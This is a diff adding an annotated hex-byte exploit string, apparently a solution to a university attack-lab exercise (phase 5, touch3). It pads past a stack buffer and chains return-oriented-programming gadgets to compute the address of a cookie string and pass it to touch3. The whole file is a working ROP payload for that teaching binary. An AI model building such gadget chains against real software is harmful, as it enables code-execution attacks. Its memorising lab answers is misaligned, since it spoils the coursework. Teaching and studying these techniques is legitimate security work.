@@ -1,0 +1,16 @@
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00 /* buffer */
+9f 28 40 00 00 00 00 00 /* step1: movq %rsp, %rax */
+b4 27 40 00 00 00 00 00 /* step2: movq %rax, %rdi */
+c0 27 40 00 00 00 00 00 /* step3: popq %rax */
+48 00 00 00 00 00 00 00 /* step4: offset */
+fe 28 40 00 00 00 00 00 /* step5: movl %eax, %ecx */
+5d 28 40 00 00 00 00 00 /* step6: movl %ecx, %edx */
+09 29 40 00 00 00 00 00 /* step7: movl %edx, %esi */
+d2 27 40 00 00 00 00 00 /* step8: lea (%rdi,%rsi,1), %eax (add_xy) */
+b4 27 40 00 00 00 00 00 /* step2: movq %rax, %rdi */
+c6 26 40 00 00 00 00 00 /* step10: touch3 address (from phase3) */
+32 61 33 39 65 66 62 64 /* step11: cookie string */
